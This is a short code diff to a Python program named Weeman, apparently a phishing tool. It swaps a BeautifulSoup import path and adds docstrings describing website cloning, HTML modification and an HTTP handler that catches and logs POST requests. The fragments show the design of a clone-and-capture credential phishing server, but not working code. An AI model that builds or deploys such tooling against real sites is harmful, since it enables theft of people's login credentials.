@@ -15,12 +15,16 @@ from socket import error as socerr
 from core.config import __version__
 from core.config import __codename__
 from core.misc import printt
-from bs4 import BeautifulSoup as bs
+from lib.bs4 import BeautifulSoup as bs
 
 class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     ## Set server version
     server_version = "Weeman %s (%s)" %(__version__, __codename__)
-
+    """
+        log handler for Simple HTTP server
+        catch the requests and parse them,
+        to view the POST requests we use cgi.
+    """
     def do_POST(self):
         post_request = []
         printt(3, "%s - sent POST request." %self.address_string())
@@ -58,6 +62,10 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                 printt(2, "%s" %arg.split()[1])
 
 class weeman(object):
+    """
+        The main class,
+        start,stop,cleanup,clone website etc.. 
+    """
     def __init__(self, url,port):
         from core.shell import url
         from core.shell import port
@@ -88,6 +96,7 @@ class weeman(object):
         else:
             printt(3, "Loading \'%s\' ..." %html_file)
             data = open(html_file, "r").read()
+        # Data
         data = bs(data, "html.parser")    
         printt(3, "Modifying the HTML file ...")
 
